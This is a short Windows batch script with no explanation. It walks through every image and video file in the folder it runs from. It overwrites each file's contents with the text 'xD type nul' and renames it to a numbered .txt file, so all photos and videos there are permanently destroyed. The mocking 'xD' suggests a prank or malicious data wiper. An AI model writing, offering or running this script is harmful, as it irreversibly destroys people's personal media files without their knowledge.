@echo off
set /a Index=1
setlocal EnableDelayedExpansion

for %%a in (*.jpg *.jpeg *.png *.webp *.mp4 *.webm *.webp *.m4v *.gif) do ( 
	echo xD type nul>%%a
    rename "*%%a" "!Index!.txt"
    set /a Index+=1
)